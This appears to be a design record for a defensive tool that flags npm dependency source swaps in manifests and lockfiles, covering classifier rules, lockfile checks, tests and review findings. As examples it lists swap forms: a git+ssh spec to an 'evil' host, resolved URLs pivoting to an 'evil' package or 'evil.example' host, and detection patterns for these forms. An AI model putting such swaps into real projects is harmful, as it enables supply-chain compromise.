# Source-swap detection on EXISTING deps — design (Gate P)

Status: **historical (implemented)** (Gate P + Gate C passed; ADR-017 Accepted
2026-07-15) · Owner:
core · Implemented in `check-new-deps.mjs` (`isSourceSpec` classifier + lockfile
`resolved`-swap detection) · This doc is retained as the design record.

## Problem

`check-new-deps` forces its positive spec grammar + lockfile pinning **only on
NEW deps**. For an EXISTING dep (name already in the base manifest's
dependencies/devDependencies/optionalDependencies union), D3 lets **any** spec
change pass once a lockfile is staged. So an attacker changing

```
"a": "^1.2.3"   →   "a": "git+ssh://git@evil/a.git"   (or a tarball URL,
                    github shorthand user/repo, npm: alias, or a local path)
```

sails through unflagged. That is a source **swap** — the security-critical hole
in the backlog. A v0.20.x attempt was backed out because a `://` regex is not a
robust classifier (it misses scp-git `git@host:` and bare `user/repo`). This
design closes the five open questions the backout raised **without** that regex.

## Scope decision (constraint 1)

**Security slice only: source-swap.** A registry range/tag change on an existing
dep (`^1.2.3` → `>=1.0.0` / `latest` / `*` / `1.x`) stays **passing** — that is
the D3 contract (a lockfile-proven registry range change is intentional; see the
D3 test) and tightening the *grammar* on changed deps directly conflicts with it.
We flag **only** a spec that resolves to a non-registry SOURCE.

Registry ⟺ source is exactly npm-package-arg's partition:
`type ∈ {version, range, tag}` = registry (not a swap);
`type ∈ {git, remote, file, directory, alias}` = source (swap).

## Classification (constraint 2) — the crux

### Availability: no new runtime dependency

`check-new-deps.mjs` imports only `node:` builtins and runs as
`node vendor/dev-standards/tools/check-new-deps.mjs` in every consumer.
`npm-package-arg` is absent from core, the pilot root, and the pilot vendor tree.
A top-level `import 'npm-package-arg'` would throw at module load — **before** the
tool's own try/catch — hard-blocking every manifest commit on any consumer whose
`vendor/dev-standards/node_modules` isn't populated at pre-commit time. A dynamic
import with a graceful fallback would fail *open* on a supply-chain gate. Both are
worse than the hole. **Decision: no npm-package-arg; a vendored classifier.**

### The classifier — a positive registry partition, fail-closed

Not a negative source-enumeration regex (the thing that got backed out). A
**positive** rule with SOURCE as the default. `:` and `/` alone are NOT enough —
Gate P (empirically, vs `npm-package-arg@14`) found source forms carrying neither:
bare archive filenames (`pkg.tgz`, `foo.tar`, `foo.tar.gz` → `file`) and
leading-dot / backslash paths (`.`, `..`, `.vendor`, `.\pkg` → `directory`). The
final rule closes those (spec is treated as **SOURCE** iff any holds):

```
isSourceSpec(spec):                    // true ⇒ source-swap
  typeof spec !== 'string'                       → source   (fail-closed)
  spec === ''                                    → registry (npm treats "" as "*")
  spec.startsWith('.')                           → source   ( . .. .vendor ./x ..\y )
  spec.includes('\\')                            → source   (windows path)
  spec.includes(':') || spec.includes('/')       → source   (proto/scp/shorthand/path/alias)
  spec.toLowerCase() ends .tgz | .tar | .tar.gz  → source   (bare archive; .zip/.bz2 are NOT)
  otherwise                                      → registry (version / range / tag)
```

**No `file:vendor/dev-standards` exemption in the classifier** (Gate P P1 #2): the
literal is `file:` → contains `:` → SOURCE, faithfully. The sanctioned-vendored
dep is exempt *naturally* — when it is unchanged (base spec == staged spec) there
is no delta to flag; a registry→vendor-path **change** is a real swap and *should*
flag. The NEW-dep grammar (`isAllowedSpec`) keeps its separate `file:vendor/...`
allowance untouched (that is the sanctioned adoption path for a NEW dep).

**Deliberate divergence from npm-package-arg:** an `npm:other@1` alias is npa
`type:alias, registry:true`, but the spec lists alias as a swap form (you declare
`a` and get `other`), so we **flag** it (it carries `:`). Intended, not a bug.

Faithfulness (empirical, 84 specs vs `npm-package-arg@14`): **zero false
negatives** — every npa `{git,remote,file,directory}` spec is caught; **zero
non-alias false positives** — every npa `{version,range,tag}` spec passes
(`foo.bar`, `a.b.c`, `x.tar.bz2`, `pkg.zip`, `latest`, `*`, all ranges → registry).
The only over-flags are pathological/throwing malformed specs (`": x"`, `"1:"`) —
harmless report-only noise. Strictly safer than npa for this gate.

Fail-closed direction is correct: a novel/unknown source form almost always
carries a protocol, a host, or a path — i.e. a `:` or `/` — so it lands in
`source` and gets flagged, not silently passed. The only registry spec that
carries a marker is the sanctioned `file:vendor/dev-standards`, exempted
explicitly.

**Empirical cross-check (against the real `npm-package-arg@14`).** Direction (a) —
the dangerous one — found **no counterexample**: no `:`-free, `/`-free spec is
classified as source (`latest`/`next`/`beta`/`*`/`1.x`/all ranges → registry).
Direction (b) turned up only pathological specs no real manifest carries: `": x"`
and `"1 : garbage"` classify as `range` despite a colon (my rule *over-flags*
them — a harmless report-only false positive), while `"1:"`, `"^1:"`, `"latest :"`
make npa **throw** `EINVALIDTAGNAME` (my rule flags them — safe, fail-closed).
Net: zero false-negatives on the security-relevant direction; the divergences are
all over-flagging of malformed input. Good enough — and strictly safer than npa
for this gate.

## Lockfile-only vector (constraint 3)

An attacker can leave `package.json` untouched (`^1.2.3`) and stage only a
lockfile whose entry now points at a source. Today the tool early-returns when
the manifest is unstaged, so this is invisible.

**Decision — inspect the staged lock for EXISTING deps, three signals.** `npm ci`
trusts the lock's `resolved` and installs from it verbatim (it does NOT re-resolve
a range against the registry), so a commit that leaves `package.json` **and** the
lock root spec at `^1.2.3` but swaps `packages["node_modules/a"].resolved`
survives `npm ci` and is invisible to the manifest-side check. Signals:

1. **Root-section spec** `packages[""][section][name]` for an existing dep must
   `isSourceSpec` → registry. A source there → finding. (Reuses the exact accessor
   the new-dep proof uses; catches a lock whose *declared* spec is a source.)
2. **Resolution scheme** `packages["node_modules/<name>"].resolved` (present
   string) must match `^https?:` (case-insensitive), else → source (Gate P P1 #3
   — replaces a `git+/git:` prefix list that missed hosted shorthands `github:u/r`,
   bare `u/r`, mixed case). A `link:true` descriptor is EXEMPT (Gate C P2): it is a
   local workspace/vendored link, not a remote swap, and flagging it false-fails
   workspace repos. A PRESENT-but-non-object descriptor (`null`/scalar/array) is a
   malformed lock entry → its own finding (Gate C P2, the N1 value-shape rule); the
   D3-valid empty `{}` descriptor stays valid.
3. **Resolution identity drift** for an existing dep whose *manifest* spec is
   registry (non-`link`): if the **base** (HEAD) lock's `resolved` registry
   identity ≠ the **staged** lock's → finding (Gate P P1 #4 + Gate C P1). Identity
   = host + the package path before the `/-/` tarball marker (stable across
   versions), NOT just the host — a host-only check missed a same-host pivot to a
   different package (`…/a/-/a-1.2.3.tgz` → `…/evil/-/evil-9.tgz`). A real version
   bump (`a-1.2.3.tgz`→`a-1.2.4.tgz`) keeps the identity and does NOT trip it. The
   base lock is read with a git-failure-operational, JSON-parse-tolerant read
   (Gate C P1 — a broad catch would fail the signal open on a read error).

Wiring: load both the base (HEAD) **manifest** and base (HEAD) **lock** (the tool
loads neither the base lock, nor the base manifest on a lock-only commit, today).
When only the lock is staged, the base manifest enumerates existing deps; when the
manifest is staged too, the manifest-side classifier is the primary and the lock
signals are the consistency backstop.

Empirical lockfileVersion-3 `resolved` shapes (harvested): registry
`https://registry.npmjs.org/abbrev/-/abbrev-3.0.1.tgz`; git
`git+ssh://git@github.com/…/abbrev-js.git#<sha>`; remote tarball
`https://…/v3.0.1.tar.gz`.

**Residual ceiling (honest — Gate P P1 #4).** Signal 3 needs the base lock to
carry a `resolved` for the dep to diff against; a dep with no base `resolved`
(e.g. first lockfile, or a `{}` descriptor) has nothing to compare, so a
FIRST-time arbitrary-https-tarball with a matching registry-shaped host is the
residual gap. Git-scheme, shorthand, `file:`, non-https, and any host-CHANGE are
all caught. Upgrade path: pin the expected registry host in `quality.json` and
assert `resolved`'s host absolutely — deferred until a consumer needs it. We do
**not** claim the manifest-side check covers a lock-only tarball; it does not.

## Section precedence (constraint 4)

npm gives `optionalDependencies` precedence over `dependencies`, so a
first-match-across-sections base/staged lookup can both **hide** a swap (compare
against the wrong section's spec) and **fabricate** one.

**Decision — build a small effective map by npm precedence** (Gate P P2 revised
the earlier "reject duplicates" plan: npm *permits* a name in both `dependencies`
and `optionalDependencies`, so rejecting would emit false findings on valid
manifests and poison the later calibration). Effective spec per name =
`optionalDependencies[name] ?? dependencies[name] ?? devDependencies[name]`
(optional wins, per npm's documented precedence; a deterministic winner otherwise).
Classify only the winning spec, for both base and staged. ~5 lines, no rejection
noise, no precedence guessing.

## Blocking vs report-only (constraint 5)

`check-new-deps` is `mode: "report-only"` in `quality.json` **and** the seed, so
today every finding (new-dep or source-swap) is non-blocking. **Decision — this
change stays report-only.** Source-swap findings are emitted on the existing
exit-1 findings channel (same as new-dep findings); the mode is **not** touched.
The report-only → blocking flip is a *separate* decision that belongs to a
`docs/CALIBRATION.md` session (≥1 dispositioned real catch, 0 operational noise)
and is coupled to the parked N1/N3 CI-enforcement items — out of scope here. We do
not add a finding that assumes blocking.

## Exit contract (unchanged)

Source-swap findings are ordinary exit-1 findings: `check-new-deps: <message>` on
stdout, one per finding. Operational failures (git error, malformed JSON,
lockfileVersion ≠ 3) stay exit 2. No new exit code.

## Test plan (unit `evaluate` + integration)

Unit (`tests/tools/check-new-deps.test.ts`), all against `evaluate`:
- existing dep `^1.2.3` → each of `git+ssh://…`, `github:u/r`, `user/repo`,
  `git@host:u/r.git`, `npm:other@^1`, `file:../x`, `./x`, `/abs`, `https://x.tgz`,
  **`pkg.tgz`**, **`.vendor`** (the marker-free forms Gate P found) with a staged
  matching lock → **source-swap finding** (one per form — the classifier proof).
- existing dep `^1.2.3` → `>=1.0.0` / `latest` / `*` / `1.x` / `x.tar.bz2` /
  `pkg.zip` with a staged lock → **no finding** (D3 range/tag preserved — the
  load-bearing regression guard; `.bz2`/`.zip` are npa-registry, must NOT flag).
- existing dep `github:u/r` → `^1.2.3` (source removed) → **no finding**.
- existing dep `file:vendor/dev-standards` UNCHANGED → **no finding** (no delta);
  existing `^1.2.3` → `file:vendor/dev-standards` (changed) → **finding** (a
  registry→vendor-path swap IS flagged — no classifier exemption).
- lock-only (manifest unstaged): base manifest `^1.2.3`; staged lock with a git
  `resolved` → **finding** (signal 2); base lock host `registry.npmjs.org` vs
  staged lock host `evil.example` for an unchanged `^1.2.3` → **finding**
  (signal 3, arbitrary-tarball); same host, version bump → **no finding**.
- name in both `dependencies` and `optionalDependencies` → classified via the
  effective map (optional wins), **no false finding**.
- all EXISTING tests stay green — especially D3 forbidden-range-passes
  (`check-new-deps.test.ts:205`), the D3 empty-`resolved` descriptor
  (`{}` at 209 — the lock signals must string-guard a missing `resolved`),
  D5 corrupt-lock / non-object-manifest throws (224/250), and dep-removed-with-lock
  passes (166).

Integration (`…integration.test.ts`) — Gate P P2: a manifest-only source-swap is a
WEAK test (D8 already reports every manifest-only spec change without any source
detection). Instead: (a) manifest `^1.2.3`→`git+ssh://…` **with a matching staged
lock** so D8 is satisfied and the source-swap classification is the SOLE finding →
report-only `fail`, runner exits 0; (b) a lock-only git `resolved` (manifest
unstaged) → `fail`, exits 0 — proving the base-manifest/base-lock wiring end to
end under the real runner.

## Seed parity + ADR

No `quality.json`/seed **shape** change (mode/exit-codes/skip_if_empty unchanged),
so no registration edit is required — but confirm both stay identical. New
behavior of a consumer-facing gate ⇒ **ADR-017** in `docs/ADR.md` (the decision:
source-swap on existing deps, vendored `isSourceSpec` classifier, report-only,
lock-only inspection incl. resolved host-drift, precedence effective-map,
documented residual tarball ceiling). BACKLOG entry moves from open to done.

## Out of scope (explicit)

Grammar tightening on changed deps (rejecting `>=1.0.0`/`latest`/`*` on an
existing dep) — conflicts with D3, deferred. Absolute registry-host pinning of
`resolved`. The report-only → blocking flip. Workspaces/pnpm/yarn (already stood
down).

## Gate P cross-check (Codex gpt-5.6-sol xhigh) — all VALID, all amended

Independent plan critique; every finding verified against the repo /
`npm-package-arg@14` before amending (Codex assertion ≠ evidence).

| # | Sev | Finding | Verdict | Amendment |
|---|-----|---------|---------|-----------|
| 1 | P1 | `:`/`/` classifier false-negatives: `pkg.tgz`/`*.tar`/`*.tar.gz`→file, `.`/`..`/`.vendor`/`.\x`→directory, no marker | **VALID** (reproduced) | classifier adds leading-`.`, `\`, and `.tgz`/`.tar`/`.tar.gz` suffix rules; fuzz 84 specs → 0 false-neg |
| 2 | P1 | `file:vendor/dev-standards` classifier exemption is a local-source bypass | **VALID** | exemption removed; vendored dep exempt naturally (no delta when unchanged); registry→vendor change flagged |
| 3 | P1 | resolved `git+/git:` prefix list misses shorthand/bare/mixed-case | **VALID** | replaced with `resolved must be ^https?: (ci) or sanctioned link` |
| 4 | P1 | "manifest-side covers the tarball ceiling" is dishonest; lock-only https-tarball survives `npm ci` | **VALID** | added base-lock **host-drift** signal; residual ceiling stated honestly (first-time same-host tarball only) |
| 5 | P2 | duplicate-section **rejection** false-positives (npm permits prod+optional) | **VALID** | switched to npm-precedence effective map |
| 6 | P2 | evaluate ordering unspecified; manifest-only integration test false-passes (D8 masks it) | **VALID** | explicit ordering baked in; integration test uses matching lock / lock-only resolved |

My own parallel pass (pre-Codex) additionally logged R1 (restructure regression
risk), R2 (base-manifest read on lock-only), R4 (`link:true`→vendor allow), R5
(double-finding dedupe) — folded into the ordering + signals above.

## Gate C cross-check (Codex gpt-5.6-sol xhigh) — all VALID, all fixed

Reviewed the implementation diff; every finding reproduced before fixing.

| # | Sev | Finding | Verdict | Fix |
|---|-----|---------|---------|-----|
| 1 | P1 | host-only signal 3 misses a same-host pivot to a different package (`…/a/…` → `…/evil/…`) | **VALID** (reproduced) | signal 3 diffs registry IDENTITY (host + pre-`/-/` path), not host |
| 2 | P1 | base-lock git-read failure swallowed by a broad catch → signal 3 fails open | **VALID** | read the blob outside the catch; only `JSON.parse` is tolerant |
| 3 | P2 | a present-but-`null`/scalar/array node_modules entry falls through all signals | **VALID** (reproduced) | `lockEntry` distinguishes absent vs present-invalid → malformed-entry finding |
| 4 | P2 | `link:true` resolutions flagged → workspace repos false-fail | **VALID** (reproduced) | signals 2/3 exempt `link:true` (generalized beyond vendor-only) |
| 5 | P2 | ADR-017 referenced but not in `docs/ADR.md` | **VALID** | ADR-017 added same batch |
| 6 | P2 | backslash fixture `.\pkg` also starts with `.` — masks the `\` rule | **VALID** | added `pkg\subdir` (isolates the backslash branch) |
| 7 | P2 | lock-only integration test uses git resolved → doesn't exercise base-lock load | **VALID** | added an HTTPS same-host-pivot integration case that needs the base lock |

**Round 2** (fix-delta re-review; all VALID, all fixed, then self-verified — the
2-round cap is reached, so no third Codex pass):

| # | Sev | Finding | Verdict | Fix |
|---|-----|---------|---------|-----|
| R2-1 | P1 | a query-addressed swap (`?pkg=a`→`?pkg=evil`) bypassed the host+path identity | **VALID** (reproduced) | fingerprint now includes `url.search` |
| R2-2 | P1 | a `link:true → node_modules/evil` indirection (target resolves remotely) skipped all signals | **VALID** (reproduced) | link exemption rejects a link resolving into `node_modules/` or to a URL |
| R2-3 | P2 | a flat-CDN version bump (no `/-/`) changed the whole path → false positive | **VALID** (reproduced) | fingerprint anchors the no-`/-/` case on the dep's own name, stripping the version tail |

The host-only signal became a name-anchored `resolvedFingerprint` (registry `/-/`
fast-path; name-anchored strip for flat/CDN/query layouts; `url.search` included) —
fail-closed in every case, and a digit-bearing name (`base64` vs `base32`) is not
confused. Residual ceilings unchanged: a first-time tarball with no base entry, and
a `link:true` swap to a genuine non-`node_modules` local path.
